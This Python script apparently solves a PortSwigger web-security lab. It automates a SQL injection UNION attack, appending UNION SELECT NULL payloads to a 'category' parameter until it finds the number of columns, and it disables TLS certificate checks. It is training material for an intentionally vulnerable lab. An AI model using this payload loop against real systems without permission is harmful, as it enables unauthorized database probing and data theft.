#!/usr/bin/env python3
import requests
import sys
from dataclasses import dataclass, field
from bs4 import BeautifulSoup
import re

# Disable warnings generated due to unverified SSL connections
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

"""
Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
To solve the lab, perform an SQL injection UNION attack that returns an additional row containing null values.
"""


@dataclass()
class Request:
    url: str = field()
    parameters: dict = field(default_factory=dict)
    session: requests.sessions.Session = field(default=requests.Session())
    response: requests.models.Response = field(default=None)

    def get(self) -> response:
        """ Perform an HTTP GET request """
        try:
            self.response = self.session.get(url=self.url, params=self.parameters, verify=False, timeout=10)
        finally:
            self.validate()

    def post(self) -> response:
        """ Perform an HTTP POST request """
        try:
            self.response = self.session.post(url=self.url, params=self.parameters, verify=False, timeout=10)
        finally:
            self.validate()

    def validate(self):
        """ Validate Request """
        try:
            self.response.raise_for_status()
        except requests.exceptions.HTTPError:
            if self.response.status_code == 404:
                help_msg = 'The session you are looking for has expired.'
                sys.exit(f'{self.response.status_code}: {self.response.reason}. {help_msg}')
        except requests.exceptions.ConnectionError as error:
            help_msg = 'Please make sure you are using a valid URL.'
            sys.exit(f'{help_msg}\n{error}')
        except requests.exceptions.RequestException as error:
            help_msg = 'Caught general exception:'
            sys.exit(f'{help_msg} {error}')


@dataclass()
class Injection(Request):
    null: list = field(default_factory=list)

    def __post_init__(self):
        self.url = f'{self.url}filter' if self.url.endswith('/') else f'{self.url}/filter'
        self.null = ["'UNION SELECT", 'NULL', '--']
        self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"

    def null_logic(self):
        while not self.response.ok:
            # Remove '--' then add ', NULL --' until response.ok is True
            self.null.remove('--')
            self.null.extend([',', 'NULL', '--'])
            self.parameters['category'] = f"Lifestyle{' '.join(self.null)}"
            self.get()


if __name__ == '__main__':
    url = 'https://abcd.web-security-academy.net/'

    sqli = Injection(url)
    sqli.get()
    sqli.null_logic()

    print(f"There are {sqli.null.count('NULL')} columns.")
